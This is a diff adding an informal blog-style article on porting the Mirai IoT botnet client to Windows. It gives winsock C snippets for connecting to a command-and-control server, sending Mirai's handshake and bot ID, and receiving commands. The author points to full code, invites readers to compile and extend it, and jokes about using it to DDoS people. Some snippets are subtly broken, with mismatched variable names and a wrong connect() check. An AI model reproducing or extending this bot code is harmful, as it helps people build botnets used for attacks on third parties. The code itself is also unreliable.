@@ -1,0 +1,104 @@
+PORTING IoT MALWARE TO WINDOWS!!!
+
+by augboi
+
+apologies in advance. I have been awake for almost 24 hours in a manic state.
+
+I don't know how many of you remember, but there was a big trend in the past few years. That big trend was botnets, speicfically IoT (Internet of Things) botnets. Botnets had been around for a while, but IoT ones really sprung up. I'm not gonna get into to much detail about IoT, but the main target for these types of botnets was routers, and cameras. People were also at one point scanning phones into their botnets. The way IoT bot herders got their bots was by scanning ranges of IP addresses, looking for devices running SSH or (don't laugh, chinese router vendors still use it) telnet. When they found these devices running SSH/telnet, they would try a few username password combinations, and if they were successful, they would automatically download the actual malware on to the device, and boom! Another one bites the dust. I'm not gonna get into detail about scanning, and I most definetly will not teach you how to do it.
+
+So what's the point of today's article? Well I guess I want to show how easy it was for me to port a super popular IoT botnet malware onto the windows platform. First let's talk about how it works!
+
+Briefly I'm gonna describe how mirai works. It's a TCP server written in golang (google's baby language which actually isn't that bad) multithreaded so that it can handle many connections at once. It recieves a command from the bot herder (yeah, the hottie with a botnet!), and when a command is recieved, the server writes it to all the connected bots. On the bot (malware/client) end, it recieves the command into a string, parses the command and then does whatever the bot herder told it to do. 
+
+So all the code you are seeing is windows C code, using the windows API. I won't include any of the linux code, because you can find that on github.
+
+But how did I port it to windows? Simple. Sockets! The original mirai code, for IoT, used traditional UNIX sockets. Well, Microsoft implemented their own socket library, called winsock, which is actually pretty cool. It's basically the same thing but for windows. The only difference is that when you first make a socket you have to add the following code
+
+WSADATA wsaData;
+WSAStartup(MAKEWORD(2,2), &wsa);
+
+You must do that once, and only once. Any less and it won't work. Any more and it will break winsock. I also will not explain WSAStartup in detail, but it basically specifies what version of winsock your program wants to use, in this case 2.2 (MAKEWORD(2,2)), and it does some other fancy windows API internal shit.
+
+that part right there should go before you do any socket code. In this case, it's in the establishconn() function. 
+
+
+
+static void establishconn() {
+
+  // DO NOT FUCKING REMOVE THIS
+
+  WSAData wsa;
+  iRes = WSAStartup(MAKEWORD(2, 2), &wsa); 
+
+  // new socket 
+  dwMainCommSock = socket(AF_INET, SOCK_STREAM, 0);
+  if (dwMainCommSock == -1) {
+    // if socket fails, bConnection becomes false, showing no connection
+    bConnection = FALSE;
+  }
+
+  // sockaddr struct, has information about socket
+
+  SOCKADDR_IN sockaddr;
+  sockaddr.sin_port = htons(69);
+  sockaddr.sin_family = AF_INET;
+
+  // Just change the IP (x.x.x.x)
+
+  sockaddr.sin_addr.s_addr = inet_addr("x.x.x.x");
+
+  // connects the socket to the server.
+  // uses the sockaddr struct to pull info
+
+  if (connect(dwMainCommSock, (SOCKADDR *)(&sockaddr), sizeof(sockaddr)) != 1) {
+    // if successful, bConnection is TRUE
+    bConnection = TRUE;
+  }
+  
+  
+
+
+that's the function for establishing a connection. I'm not going to get too much into the logic of establishing a connection. If you compare the original mirai function to the one I made above, you will see they are actually pretty similar! The main difference is WSAStartup, which is necessary. You also use a different data structure for sockaddr. In the original mirai code (linux) it uses
+
+struct sockaddr_in
+
+in the windows code it has a different definition
+
+SOCKADDR_IN
+
+but it's basically the same thing. Moving on! Once you have a connection this is what the code looks like
+
+  char *chIdBuf = NULL;
+  //ZeroMemory(id_buf, sizeof(id_buf));
+  // this is a windows bot
+  // so the id buf is "windows"
+  chIdBuf = (char *)"windows"; 
+  UINT8 uintIdLen = strlen(chIdBuf); // length of the ID buffer
+
+  // sends 4 bytes to connect
+
+  send(dwMainCommSock, "\x00\x00\x00\x01", 4, NULL);
+  send(dwMainCommSock, (const char *)&uintIdLen, sizeof(uintIdLen), NULL);
+
+  if (uintIdLen > 0) { // if the length of ID is greater than 0
+    // sends the ID buffer
+    send(dwMainCommSock, chIdBuf, uintIdLen, NULL);
+  }
+
+
+you can see here (and in the comments) that this is a windows bot so the buffer will always be "windows". It sends 4 bytes to connect to the server ("\x00\x00\x00\x01") and then it sends the ID buffer ("windows"). 
+
+After that, you have to add code to recieving the buffer to parse. In theory you have to create a function to read from the socket until a newline character ("\n"), or figure out the length of the buffer to receive and then read that many bytes in. In theory it would look like this.
+
+
+  int retval = recv(maincommsock, (char *)&len,sizeof(len), 0);	
+  printf("retval: %d\n", retval);
+  len = htons(len);
+  if (retval == sizeof(len)) {
+    retval = recv(maincommsock, (char *)rdbuf, len, 0);
+    printf("retval: %d\n", retval);
+
+    printf("RDBUF: %s\n", rdbuf);
+  }
+
+but that's something you gotta figure out yourself. After that it gets pretty illegal, adding parsing so you can use it to DDoS kids online... Whatever. But what did you learn today? Well you learned a few things. You learned that porting linux socket code over to windows is pretty much as simple as two lines of code and messing with some data structures. You also learned how the mirai IoT botnet works, and how to make it work for windows. You can find the full code on github. Feel free to compile it and test it yourself, and add on to it!
